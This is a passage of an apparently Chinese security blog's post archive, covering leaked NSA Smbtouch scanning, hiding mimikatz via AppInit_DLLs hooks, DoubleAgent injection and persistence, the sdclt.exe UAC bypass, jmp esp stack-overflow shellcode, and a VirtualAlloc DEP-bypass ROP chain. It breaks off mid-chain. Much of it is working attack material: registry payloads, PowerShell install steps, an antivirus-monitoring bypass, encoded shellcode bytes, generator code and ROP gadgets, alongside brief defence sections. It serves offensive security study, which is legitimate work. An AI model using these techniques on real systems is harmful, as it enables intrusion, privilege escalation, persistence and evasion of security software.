2.0.0 Explodingcan 2.0.2 Zippybeer 1.0.2 Plugin Category: Payload ======================== Name Version ---- ------- Doublepulsar 1.3.1 Jobadd 1.1.1 Jobdelete 1.1.1 Joblist 1.1.1 Pcdlllauncher 2.3.1 Processlist 1.1.1 Regdelete 1.1.1 Regenum 1.1.1 Regread 1.1.1 Regwrite 1.1.1 Rpcproxy 1.0.1 Smbdelete 1.1.1 Smblist 1.1.1 Smbread 1.1.1 Smbwrite 1.1.1 Plugin Category: Special ======================== Name Version ---- ------- Eternalblue 2.2.0 Eternalchampion 2.0.0 插件共分为五大类，分别为： Touch 信息探测、漏洞测试 ImplantConfig 植入工具 Exploit 漏洞利用 Payload Payload Special 专用 每一个插件在文件夹下对应三个文件： .exe .fb .xml 例如Special下的Eternalblue-2.2.0，对应shadowbroker-master\windows\specials下的 Eternalblue-2.2.0.exe Eternalblue-2.2.0.fb Eternalblue-2.2.0.0.xml 查看文件内容可发现： exe能够单独执行(前提是找到需要的dll文件) exe读取xml文件中保存的配置参数（需要二次修改） 也就是说，只需要单独的exe和xml配置文件，加上需要的支持文件，就能够执行对应的插件，不需要完全安装FuzzBunch框架 0x03 Smbtouch 位于Touch类下，文件位于/windows/touches/，用于探测目标主机是否包含SMB和NBT远程提权漏漏洞，主要测试以下四个漏洞： ETERNALBLUE ETERNALCHAMPION ETERNALROMANCE ETERNALSYNERGY 1.命令行下测试执行fb.py,进入命令行操作模式 设置好扫描参数，依次执行： use Smbtouch execute 如下图 接着执行插件，回显如下图 探测成功，获得如下信息： 系统：Windows Server 2003 3790 Service Pack 2 x86 可用漏洞： ETERNALROMANCE - FB ETERNALCHAMPION - DANE/FB 接着使用具体的漏洞攻击即可 注: 被攻击主机需要开放445端口，测试环境可选择关闭防火墙或是手动打开445端口 命令行开启445端口的代码如下: netsh advfirewall firewall add rule name=&quot;445&quot; protocol=TCP dir=in localport=445 action=allow 2.直接执行exe进入文件夹shadowbroker-master\windows\touches，直接执行Smbtouch-1.1.1.exe 提示缺少dll，如图 在文件夹shadowbroker-master\windows\lib\x86-Windows下找到缺失的dll，补全 直接执行Smbtouch-1.1.1.exe，回显提示： TargetIp must have a value assigned. 所以接下来需要编辑Smbtouch-1.1.1.0.xml文件 需要添加如下参数： NetworkTimeout：60 TargetIp：127.0.0.1 TargetPort：445 Protocol：SMB Credentials：Anonymous 对照xml文件格式，添加代码&lt;value&gt;data&lt;/value&gt;，并且重命名为Smbtouch-1.1.1.xml 注： 文件名不是原来的Smbtouch-1.1.1.0.xml 修改好的xml文件可参照： https://github.com/3gstudent/Smbtouch-Scanner/blob/master/Smbtouch-1.1.1.xml 再次执行Smbtouch-1.1.1.exe 回显如图 成功执行，并且回显xml文件内容 0x04 Smbtouch Scanner 基于以上内容，如果想尝试对指定网段进行扫描，那么需要反复修改xml配置文件，接着执行Smbtouch-1.1.1.exe进行探测 采用python自动实现以上操作，需要考虑如下问题： 执行Smbtouch-1.1.1.exe并获得回显 对回显内容进行解析，去掉多余部分 对范围ip地址解析 自动读写xml文件 生成log文件 多线程提高效率 完整代码可参考： https://github.com/3gstudent/Smbtouch-Scanner 实际测试：1.设置扫描ip段如图 2.执行SmbtouchScanner.py等待扫描完成，回显显示简要信息 如图 3.同级目录生成日志文件，显示详细信息包含具体存在的漏洞，如图 4.补充考虑到安全原因，此开源代码尚不支持多线程 0x05 防御建议 针对NSA的SMB和NBT远程提权漏漏洞，建议升级系统补丁，开启防火墙，限制445端口 限制445端口的命令行代码如下： netsh advfirewall firewall add rule name=&quot;445&quot; protocol=TCP dir=in localport=445 action=block 同时，为确保内网安全，可使用SmbtouchScanner.py对内网进行扫描检测 注： 目前Smbtouch-1.1.1.exe已被杀毒软件查杀 0x06 小结 本文介绍了如何使用python实现自动检测内网是否存在可被SMB和NBT协议攻击的漏洞，当然，泄露的漏洞不止以上4个，Touch插件也不只有Smbtouch 后续更新会同步至github：https://github.com/3gstudent/ LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[利用globalAPIhooks在Win7系统下隐藏进程]]></title>
    <url>%2Fposts%2Fdd4e21a6.html</url>
    <content type="text"><![CDATA[0x00 前言 在之前的文章《Powershell tricks::Hide Process by kd.exe》介绍过通过kd.exe隐藏进程的技巧，最大的缺点是需要开启Local kernel debugging模式，等待重启才能生效这次介绍另外一个隐藏进程的方法——利用global API hooks优点是即时生效，不需要等待系统重启 0x01 简介 本文将要参照Sergey Podobry的文章，对该方法进行介绍，分析实际测试中需要注意的细节，并补全在64位下具体的参数设置 参考链接： https://www.codeproject.com/articles/49319/easy-way-to-set-up-global-api-hooks?display=print https://github.com/subTee/AppInitGlobalHooks-Mimikatz 0x02 原理 在用户层，通过global API hooks将测试dll注入到系统的所有进程，实现对指定进程的隐藏 hook方式修改注册表键值AppInit_DLLs 位置： HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows 参数说明： LoadAppInit_DLLs: (REG_DWORD) Value that globally enables or disables AppInit_DLLs. 0x0 – AppInit_DLLs are disabled. 0x1 – AppInit_DLLs are enabled. AppInit_DLLs: (REG_SZ)Space - or comma -separated list of DLLs to load. The complete path to the DLL should be specified using short file names. C:\PROGRA~1\Test\Test.dll RequireSignedAppInit_DLLs: (REG_DWORD) Require code-signed DLLs. 0x0 – Load any DLLs. 0x1 – Load only code-signed DLLs. 代码实现通过Mhook library实现API hooking 优点： 开源 支持x86和x64 使用简便 参考地址： http://codefromthe70s.org/mhook22.aspx 0x03 实际测试 测试环境： Win7x86 1.设置注册表键值AppInit_DLLs参照代码： https://github.com/subTee/AppInitGlobalHooks-Mimikatz/blob/master/AppInit.reg .reg文件如下： Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows] &quot;AppInit_DLLs&quot;=&quot;C:\\Tools\\AppInitHookx64.dll,C:\\Tools\\AppInitHook.dll&quot; &quot;LoadAppInit_DLLs&quot;=dword:00000001 &quot;RequireSignedAppInit_DLLs&quot;=dword:00000000 表示 AppInit_DLLs are enabled Load any DLLs，do not need code-signed DLLs DLL path：C:\Tools\AppInitHookx64.dll,C:\Tools\AppInitHook.dll 注： 设置的路径不能存在空格，否则失效 2.编译生成AppInitHook.dll并放在C:\Tools下参照工程： https://github.com/subTee/AppInitGlobalHooks-Mimikatz 3.运行mimikatz.exe任务管理器进程列表不存在mimikatz.exe Process Explorer不存在mimikatz.exe Tasklist.exe不存在mimikatz.exe 注： 此处没有完全隐藏进程，是将进程名设置为conhost.exe，这是因为mimikatz是控制台应用程序 如果换成putty.exe或calc.exe这种Win32项目，则不存在这个问题，能够完全隐藏进程 使用Process Explorer查看新建的进程，均加载了AppInitHook.dll，如图 注： 管理员权限运行Process Explorer，可查看高权限进程加载的dll 4.Win7x64测试64位系统同32位系统的区别在注册表也有所体现 注： 详情可参考之前的文章《关于32位程序在64位系统下运行中需要注意的重定向问题》 64位程序对应注册表位置： HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ 32位程序对应注册表位置： HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\ 所以，如果要hook 64位系统下的所有进程(32位和64位)，需要修改两处注册表键值 64位的注册表键值位置： [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Windows] 32位的注册表键值位置： [HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows] 具体修改代码已上传至github，地址如下： https://github.com/3gstudent/AppInitGlobalHooks-Mimikatz/blob/master/AppInit64.reg 修改后使用Process Explorer查看如图 成功注入32位和64位进程 0x04 补充 该方法只支持Win7 和 Windows Server 2008 R2，不支持更高版本如Win8、Server2012 如上图，在Win8系统，虽然成功加载AppInitHook.dll，但是无法隐藏进程 原因如下： 从Win8系统开始，微软对AppInit_DLLs做了限制：bios中默认开启的secure boot将会禁用AppInit_DLLs，使其失效 详情可参照： https://msdn.microsoft.com/en-us/library/windows/desktop/dn280412(v=vs.85).aspx 0x05 防御 只针对Win7 和 Windows Server 2008 R2及以下系统 1.查看注册表键值 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Windows] [HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows] AppInit_DLLs项有无可疑dll路径 2.通过Process Explorer查看进程有无加载可疑的dll 0x06 小结 本文对利用global API hooks在Win7系统下隐藏进程的方法做了介绍，结合利用思路，帮助大家对这种利用方式进行更好的防御 当然，利用global API hooks能做的还有更多 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透测试中的Application Verifier(DoubleAgent利用介绍)]]></title>
    <url>%2Fposts%2Ff4673eee.html</url>
    <content type="text"><![CDATA[0x00 前言 近日，Cybellum Technologies LTD公开了一个0-day漏洞的POC，对其命名为“DoubleAgent”,可用于控制主流的杀毒软件 不同于以往的绕过思路，这次使用的是一种直接攻击并劫持的方式 本文将要介绍该方式的原理，分享利用思路、攻击条件和防御方法 Cybellum的博客链接如下： https://cybellum.com/doubleagent-taking-full-control-antivirus/ https://cybellum.com/doubleagentzero-day-code-injection-and-persistence-technique/ POC： https://github.com/Cybellum/DoubleAgent 0x01 简介 该方式主要是对微软系统自带的Application Verifier（应用程序检验器）进行利用 利用过程如下： 编写自定义Verifier provider DLL 通过Application Verifier进行安装 注入到目标进程执行payload 每当目标进程启动，均会执行payload，相当于一个自启动的方式 Application Verifier支持系统： WinXP-Win10 理论上，该利用方式支持WinXP-Win10，但是POC提供的dll在部分操作系统下会报错，修复方法暂略，本文仅挑选一个默认成功的系统进行测试——Win8.1 x86 0x02 application verifier 是针对非托管代码的运行时验证工具，它有助于找到细小的编程错误、安全问题和受限的用户帐户特权问题，使用常规的应用程序测试技术很难识别出这些错误和问题 注： 类似于Application Compatibility Shims，可以理解为一种补丁机制 关于Application Compatibility Shims在渗透测试中的利用技巧可参照： https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims/ 更多基础概念可参考微软官方文档，地址如下： https://msdn.microsoft.com/zh-cn/library/aa480483.aspx 测试系统： Win8.1 x86(默认支持application verifier) cmd输入(管理员权限)： appverif 进入控制界面，通过面板查看配置验证器 如图 添加一个测试程序，可对其检测和调试内存损坏、危险的安全漏洞以及受限的用户帐户特权问题 如图 通过命令行也能够实现相同的操作 命令行添加： appverif /verify notepad.exe 命令行删除： appverif /n notepad.exe 注： 对于运行中的进程，不能安装application verifier 0x03 实际测试 POC编译环境搭建： 安装VS2017 安装Windows SDK for Windows 8.1 测试系统： Win8.1 x86 POC添加shellcode： MessageBox(NULL, NULL, NULL, 0); 部分代码如下： static BOOL main_DllMainProcessAttach(VOID) { DOUBLEAGENT_STATUS eStatus = DOUBLEAGENT_STATUS_INVALID_VALUE; MessageBox(NULL, NULL, NULL, 0); DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_SUCCESS); return FALSE != DOUBLEAGENT_SUCCESS(eStatus); } 编译后将DoubleAgent_x86.exe和\x86\DoubleAgentDll.dll放于同级目录下 cmd下：(管理员权限) 安装： DoubleAgent_x86.exe install notepad.exe 卸载： DoubleAgent_x86.exe uninstall notepad.exe 如图 安装后，启动notepad.exe，弹框，之后正常启动notepad.exe 安装成功后，在面板中也可以看到安装的verifier cmd输入appverif 如图 如果想要劫持非系统默认安装的程序，那么该程序需要存放于system32文件夹下(或者新建快捷方式存放于system32并指向原程序) 需要先将DoubleAgentDll.dll复制到system32下，再通过命令行安装 安装成功后，在注册表会保存安装信息： 注册表位置： [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe] 键值信息如下： &quot;GlobalFlag&quot;=&quot;0x100&quot; &quot;VerifierDlls&quot;=&quot;DoubleAgentDll.dll&quot; 如果删除该注册表键值，那么verifier失效 注： 查看poc源码发现安装操作是通过新建注册表键值的方法 所以下面尝试通过脚本新建注册表键值来实现verifier的安装： 1、powershell测试代码实现注册表键值的添加 New-Item -itemType DWord &quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; New-ItemProperty -path &quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; -name GlobalFlag -propertytype Dword -value 0x100 New-ItemProperty -path &quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; -name VerifierDlls -propertytype String -value DoubleAgentDll.dll 2、将测试dll复制到system32下 copy DoubleAgentDll.dll c:\windows\system32\DoubleAgentDll.dll 3、再次启动notepad.exe，弹框 代表verifier被安装 4、删除verifier的powershell代码： Del &quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; -recurse 注： 部分杀毒软件会对注册表HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\进行监控 绕过方法： 新建一个任意名称的注册表键值，再重命名为目标程序 0x04 分析 利用方式： dll注入 自启动 主要用于后渗透阶段 特别的地方： 绕过杀毒软件的拦截，并能够对杀毒软件本身进行注入，使杀毒软件本身失效或者对其利用 攻击条件： 获得管理员权限 POC——&gt;EXP: 参照其中DoubleAgentDll工程生成dll，通过powershell或其他脚本实现安装利用 防御方法： 监控注册表键值HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ 控制管理员权限 查看system32下有无可疑dll和快捷方式 0x05 小结 本文对“DoubleAgent”的原理、利用思路、攻击条件和防御方法作了简要介绍，希望能够帮助大家 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Study Notes of using sdclt.exe to bypass UAC]]></title>
    <url>%2Fposts%2Fcc2ef165.html</url>
    <content type="text"><![CDATA[0x00 前言 Matt Nelson‏ @enigma0x3在最近的文章中公开了一个绕过Win10 UAC的技巧，通过修改HKCU下的注册表键值实现对UAC的绕过，文章地址如下： https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/ https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/ 0x01 简介 本文将对其进行测试，分享测试心得，整理该方法的攻防技巧 0x02 原理 Sigcheck 可用来查看exe文件的清单(manifest) 下载地址： https://technet.microsoft.com/en-us/sysinternals/bb897441.aspx 在Win10环境下，cmd下运行： sigcheck.exe -m c:\windows\system32\sdclt.exe 如图 level=”requireAdministrator” true代表可自动提升权限 在Win7环境下，同样使用Sigcheck查看sdclt.exe 如图 level=”asInvoker”表示不会提升权限，这也就是不支持Win7的原因 接下来，使用ProcessMonitor监控sdclt.exe的启动过程，查找是否会调用其他程序 0x03 实际测试 测试环境： Win 10 x64 注： 该方法只在Win10下测试成功 cmd下输入： sdclt.exe 正常启动，如图 使用ProcessMonitor查看启动过程 如图 启动sdclt.exe的过程中会以High权限查找注册表键值HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe 如果手动修改该注册表键值，填入参数，那么就能够实现UAC的绕过 绕过方法如下： 新建注册表键值： HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe 并将默认值设置为cmd.exe 如图 再次启动sdclt.exe，发现转而去执行cmd.exe，并且实现了对UAC的绕过，如图 注： 启动的exe不能加参数，否则失败 例如填入C:\Windows\System32\cmd.exe /c calc.exe，无法实现利用 如图 在实际利用的过程中，如果需要加参数，可通过先将参数写入脚本，再加载脚本的方式进行利用 为了更好的隐蔽，实现“无文件”利用，可以尝试寻找sdclt.exe是否存在支持传入参数的命令 Matt Nelson‏ @enigma0x3的第二篇文章就是解决了这个问题，文章地址如下： https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/ 修改注册表，劫持/kickoffelev传入的参数，实现“无文件”利用 具体方法如下： 新建注册表键值： HKCU:\Software\Classes\exefile\shell\runas\command\ 新建项isolatedCommand，类型REG_SZ，内容作为启动参数，可设置为notepad.exe 如图 接着在cmd下输入： sdclt.exe /KickOffElev 成功执行参数，启动notetad.exe，如图 参数换成regedit.exe，启动过程并未被UAC拦截，成功绕过 如图 但是通过创建注册表键值exefile\shell\runas\command\会影响其他正常exe程序的启动，所以在利用上需要先创建键值，执行sdclt.exe，之后再删除该键值 整个过程通过powershell实现，完整POC可参考： https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-SDCLTBypass.ps1 0x04 防御和检测 防御： UAC权限设置为“Always Notify”，那么该方法将会失效 检测： 监控注册表键值： HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe HKCU:\Software\Classes\exefile\shell\runas\command\ LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Windows Shellcode学习笔记——栈溢出中对jmp esp的利用与优化]]></title>
    <url>%2Fposts%2F258f8236.html</url>
    <content type="text"><![CDATA[0x00 前言 在《Windows Shellcode学习笔记——shellcode在栈溢出中的利用与优化》中对栈溢出的利用做了介绍。通过将返回地址覆盖为shellcode在内存中的起始地址，实现对栈溢出的利用 但是shellcode在内存中的起始地址往往不固定，导致漏洞利用不一定成功，本文将通过jmp esp的方式来解决这个问题 0x01 简介 函数代码在栈中保存顺序(直观理解，已省略其他细节)： buffer 前栈帧EBP 返回地址 ESP ESP寄存器总是指向返回地址的下一地址 如果用jmp esp覆盖返回地址，那么在函数返回后会执行jmp esp，跳到esp，也就是返回地址的下一地址开始执行 因此，将shellcode放于返回地址之后，并将返回地址覆盖为jmp esp，就可以避免shellcode在内存中产生的移位问题 本文将要介绍使用jmp esp的具体细节，并分享如何优化我们自己生成的弹框实例shellcode，实现jmp esp利用，编写程序自动实现，解决shellcode在内存中的起始地址不固定的问题。 弹框实例shellcode下载地址： https://github.com/3gstudent/Shellcode-Generater/blob/master/shellcode.bin 0x01 jmp esp 获得jmp esp的机器码： 可通过搜索各个进程空间来获取，具体原理可参考《0day安全：软件漏洞分析技术》3.2.2节 为便于理解和测试，直接引用《0day安全：软件漏洞分析技术》3.2.2节中的代码，代码如下： #include &lt;stdio.h&gt; #include &lt;windows.h&gt; #define DLL_NAME &quot;user32.dll&quot; int main() { BYTE *ptr; int position,address; HINSTANCE handle; BOOL done_flag=FALSE; handle=LoadLibrary(DLL_NAME); if(!handle) { printf(&quot;load dll error&quot;); return 0; } ptr=(BYTE *)handle; for(position=0;!done_flag;position++) { try { if(ptr[position]==0xFF &amp;&amp;ptr[position+1]==0xE4) { int address=(int)ptr+position; printf(&quot;OPCODE found at 0x%x\n&quot;,address); } } catch(...) { int address=(int)ptr+position; printf(&quot;END OF 0x%x\n&quot;,address); done_flag=true; } } return 0; } 如下图，获得机器码，挑选第一个地址0x77d29353，构建我们的shellcode 初步设想shellcode的结构为： 填充数据(长度44)+偏移长度+jmp esp的机器码+解码器+加密的弹框shellcode+结束字符 具体数据为： &quot;\x34\x33\x32\x31“*11+&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;+&quot;\x53\x93\xD2\x77&quot;+&quot;\x83\xC2\x14\x33\xC9\x8A\x1C\x0A\x80\xF3\x44\x88\x1C\x0A\x41\x80\xFB\x91\x75\xF1&quot;+加密的弹框shellcode+\xD5 通过程序自动实现此过程，代码如下： #include &lt;windows.h&gt; size_t GetSize(char * szFilePath) { size_t size; FILE* f = fopen(szFilePath, &quot;rb&quot;); fseek(f, 0, SEEK_END); size = ftell(f); rewind(f); fclose(f); return size; } unsigned char* ReadBinaryFile(char *szFilePath, size_t *size) { unsigned char *p = NULL; FILE* f = NULL; size_t res = 0; *size = GetSize(szFilePath); if (*size == 0) return NULL; f = fopen(szFilePath, &quot;rb&quot;); if (f == NULL) { printf(&quot;Binary file does not exists!\n&quot;); return 0; } p = new unsigned char[*size]; rewind(f); res = fread(p, sizeof(unsigned char), *size, f); fclose(f); if (res == 0) { delete[] p; return NULL; } return p; } int main(int argc, char* argv[]) { char *szFilePath=&quot;c:\\test\\shellcode.bin&quot;; char *szFilePath2=&quot;c:\\test\\shellcode2.bin&quot;; unsigned char *BinData = NULL; size_t size = 0; BinData = ReadBinaryFile(szFilePath, &amp;size); for(int i=0;i&lt;size;i++) { BinData[i]=BinData[i]^0x44; } FILE* f = NULL; f = fopen(szFilePath2, &quot;wb&quot;); if (f == NULL) { printf(&quot;Create error\n&quot;); return 0; } char filler[]=&quot;\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31&quot;; char nop[]=&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;; char jmpesp[]=&quot;\x53\x93\xD2\x77&quot;; char decode[]=&quot;\x83\xC2\x14\x33\xC9\x8A\x1C\x0A\x80\xF3\x44\x88\x1C\x0A\x41\x80\xFB\x91\x75\xF1&quot;; char end[]=&quot;\xD5&quot;; fwrite(filler,sizeof(filler)-1,1,f); fwrite(nop,sizeof(nop)-1,1,f); fwrite(jmpesp,sizeof(jmpesp)-1,1,f); fwrite(decode,sizeof(decode)-1,1,f); fwrite(BinData,size,1,f); fwrite(end,1,1,f); fclose(f); } 运行后生成shellcode2.bin 由于我们自己生成的这个shellcode长度较长，在测试时需要对原书中的栈溢出程序作修改，否则会报错，例如if(!(fp=fopen(&quot;password.txt&quot;,&quot;rw+&quot;)))应修改为if(!(fp=fopen(&quot;password2.txt&quot;,&quot;rb&quot;))) 更多细节可参考完整代码，栈溢出测试程序的完整代码已上传至github，地址如下： https://github.com/3gstudent/Shellcode-Generater/blob/master/stackoverflowExample(jmpesp).cpp 测试栈溢出测试程序 测试环境： 测试系统：Win XP 编译器：VC6.0 build版本： debug版本 测试栈溢出测试程序，发现报错 0x02 shellcode调试与优化 使用OllyDbg调试 关键位置按F2下断点，按F9执行到断点处 如下图，成功覆盖返回地址，数值为0x77d29353 按F8单步执行，跳到JMP ESP，如下图 接着F8单步执行，如下图，此时EDX寄存器不再保存shellcode起始地址，EDX值为0x0012FFE0，而理论上shellcode起始地址应为0x0012F77C 需要找到一个能保存shellcode起始地址的寄存器或者存在某种偏移关系的寄存器 通过进一步调试，发现整个过程EDI寄存器的值保持不变，为 0X0012F720，而且shellcode起始地址作了变化，不再是0x0012F77C 如下图，在CALL test2.004011A0下断点，shellcode起始地址由0x0012F77C变为0X0012F6F0 如下图，0x0012F77C已被覆盖，侧面证明shellcode起始地址发生变化 综上，可大胆推测实际shellcode起始地址=EDI-0X000008F0h 解码器实现思路如下： 通过EDI-0X000008F0h来获得shellcode起始地址，并且保存在寄存器EAX中 对应汇编代码如下： void main() { __asm { sub edi,0x8F0 mov eax,edi add eax,0x28 xor ecx,ecx decode_loop: mov bl,[eax+ecx] xor bl,0x44 mov [eax+ecx],bl inc ecx cmp bl,0x91 jne decode_loop } } 提取出机器码为&quot;\x81\xEF\xF0\x08\x00\x00\x8B\xC7\x83\xC0\x28\x33\xC9\x8A\x1C\x08\x80\xF3\x44\x88\x1C\x08\x41\x80\xFB\x91\x75\xF1&quot; 如图 此时又出现\x00字符，实际使用时会被提前截断，所以汇编代码需要作进一步优化： 通过先加后减两步操作，来避免shellcode出现\00字符 注： 先减后加会造成越界 先加后减两步操作如下： EDI-0X000008F0h=0X0012F720+0X11111111h-0X111119A1h 由于shellcode前面多了填充数据，所以解码器的偏移也要重新计算，偏移=填充数据长度+解码器长度=0x34+0x26=0x5A 对应完整汇编代码如下： void main() { __asm { add edi,0X11111111 sub edi,0X111119A1 mov eax,edi add eax,0x5A xor ecx,ecx decode_loop: mov bl,[eax+ecx] xor bl,0x44 mov [eax+ecx],bl inc ecx cmp bl,0x91 jne decode_loop } } 如上图，提取机器码为 &quot;\x81\xC7\x11\x11\x11\x11\x81\xEF\xA1\x19\x11\x11\x8B\xC7\x83\xC0\x5A\x33\xC9\x8A\x1C\x08\x80\xF3\x44\x88\x1C\x08\x41\x80\xFB\x91\x75\xF1&quot; 如下图，寻址正常，shellcode成功执行 0x03 程序自动实现将以上代码同获得jmp esp机器码的代码融合，实现自动获取jmp esp的机器码并写入shellcode，完整代码已上传至github： https://github.com/3gstudent/Shellcode-Generater/blob/master/jmpespshellcode.cpp 注： 通过子函数GetAddress()实现自动寻址，需要先从子函数GetAddress()返回int型数据，再在main函数中通过指针读取jmp esp的机器码 如果顺序颠倒，那么地址无法获取 错误的获取地址代码如下： unsigned char *GetAddress() { BYTE *ptr; int position,address; HINSTANCE handle; BOOL done_flag=FALSE; handle=LoadLibrary(DLL_NAME); if(!handle) { printf(&quot;load dll error&quot;); return 0; } ptr=(BYTE *)handle; for(position=0;!done_flag;position++) { try { if(ptr[position]==0xFF &amp;&amp;ptr[position+1]==0xE4) { int address=(int)ptr+position; unsigned char *Buff=(unsigned char *)&amp;address; return Buff; } } catch(...) { int address=(int)ptr+position; printf(&quot;END OF 0x%x\n&quot;,address); done_flag=true; } } return 0; } unsigned char *jmpesp=NULL; jmpesp=GetAddress(); 0x04 小结 本文介绍了栈溢出中使用jmp esp的利用方法，结合遇到的实际情况对我们自己生成的弹框实例shellcode作优化，选取固定寄存器地址，计算偏移，最终定位shellcode起始地址，完成利用。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Windows Shellcode学习笔记——利用VirtualAlloc绕过DEP]]></title>
    <url>%2Fposts%2F4f8362d8.html</url>
    <content type="text"><![CDATA[0x00 前言 接着介绍DEP绕过的另一种方法——利用VirtualAlloc绕过DEP。通过VirtualAlloc函数可以申请一段具有可执行属性的内存，相比于VirtualProtect，传入VirtualAlloc的四个参数不需要先读取再赋值，可在shellcode中直接指定，结构更简单。当然，利用Immunity Debugger的mona插件可自动构造利用VirtualAlloc绕过DEP的ROP链。 0x01 简介 本文将要介绍以下内容： 调用VirtualAlloc函数时的Bug及修复 选择合适的替代指令，修改mona自动生成的rop链，实现利用 利用VirtualAlloc绕过DEP时需要考虑的细节，如对shellcode的长度要求 0x02 相关概念 VirtualAlloc: LPVOID WINAPI VirtualAlloc(LPVOID lpAddress,SIZE_T dwSize,DWORD flAllocationType,DWORD flProtect) lpAddress:申请内存区域的地址dwSize:申请内存区域的大小flAllocationType:申请内存的类型flProtect:申请内存的访问控制类型 申请成功时函数返回申请内存的起始地址，申请失败时返回NULL 0x03 实际测试 测试环境： 测试系统： Win 7 编译器： VS2012 build版本： Release 项目属性： 关闭GS 关闭优化 关闭SEH 打开DEP 关闭ASLR 禁用c++异常 禁用内部函数 注： 详细配置方法在上篇文章有说明 同样是测试memcpy的缓冲器溢出，测试POC如下： unsigned int shellcode[]= { 0x90909090,0x90909090,0x90909090,0x90909090, 0x90909090,0x90909090,0x90909090,0x90909090, 0x90909090,0x90909090,0x90909090,0x90909090, 0x90909090, 0x41414141, 0x41414141 }; void test() { char buffer[48]; printf(&quot;3\n&quot;); memcpy(buffer,shellcode,sizeof(shellcode)); } int main() { printf(&quot;1\n&quot;); test(); return 0; } 编译成exe，使用Immunity Debugger打开 使用mona插件自动生成rop链，输入： !mona rop -m *.dll -cp nonull 查看rop_chains.txt，会列出可用来关闭DEP的ROP链 选择VirtualAlloc函数，详情如下： Register setup for VirtualAlloc() : -------------------------------------------- EAX = NOP (0x90909090) ECX = flProtect (0x40) EDX = flAllocationType (0x1000) EBX = dwSize ESP = lpAddress (automatic) EBP = ReturnTo (ptr to jmp esp) ESI = ptr to VirtualAlloc() EDI = ROP NOP (RETN) --- alternative chain --- EAX = ptr to &amp;VirtualAlloc() ECX = flProtect (0x40) EDX = flAllocationType (0x1000) EBX = dwSize ESP = lpAddress (automatic) EBP = POP (skip 4 bytes) ESI = ptr to JMP [EAX] EDI = ROP NOP (RETN) + place ptr to &quot;jmp esp&quot; on stack, below PUSHAD -------------------------------------------- ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] : -------------------------------------------------------- *** [ C ] *** #define CREATE_ROP_CHAIN(name, ...) \ int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \ unsigned int name[name##_length / sizeof(unsigned int)]; \ create_rop_chain(name, ##__VA_ARGS__); int create_rop_chain(unsigned int *buf, unsigned int ) { // rop chain generated with mona.py - www.corelan.be unsigned int rop_gadgets[] = { 0x693a2e92, // POP ECX // RETN [MSVCR110.dll] 0x693bd19c, // ptr to &amp;VirtualAlloc() [IAT MSVCR110.dll] 0x69353486, // MOV EAX,DWORD PTR DS:[ECX] // RETN [MSVCR110.dll] 0x779f9dca, // XCHG EAX,ESI // RETN [ntdll.dll] 0x69370742, // POP EBP // RETN [MSVCR110.dll] 0x75dac58d, // &amp; call esp [KERNELBASE.dll] 0x6932ea52, // POP EAX // RETN [MSVCR110.dll] 0xffffffff, // Value to negate, will become 0x00000001 0x69353746, // NEG EAX // RETN [MSVCR110.dll] 0x75da655d, // XCHG EAX,EBX // ADD BH,CH // DEC ECX // RETN 0x10 [KERNELBASE.dll] 0x77216829, // POP EAX // RETN [kernel32.dll] 0x41414141, // Filler (RETN offset compensation) 0x41414141, // Filler (RETN offset compensation) 0x41414141, // Filler (RETN offset compensation) 0x41414141, // Filler (RETN offset compensation) 0xa2800fc0, // put delta into eax (-&gt; put 0x00001000 into edx) 0x7721502a, // ADD EAX,5D800040 // RETN 0x04 [kernel32.dll] 0x771abd3a, // XCHG EAX,EDX // RETN [kernel32.dll] 0x41414141, // Filler (RETN offset compensation) 0x69329bb1, // POP EAX // RETN [MSVCR110.dll] 0xffffffc0, // Value to negate, will become 0x00000040 0x69354484, // NEG EAX // RETN [MSVCR110.dll] 0x771d0946, // XCHG 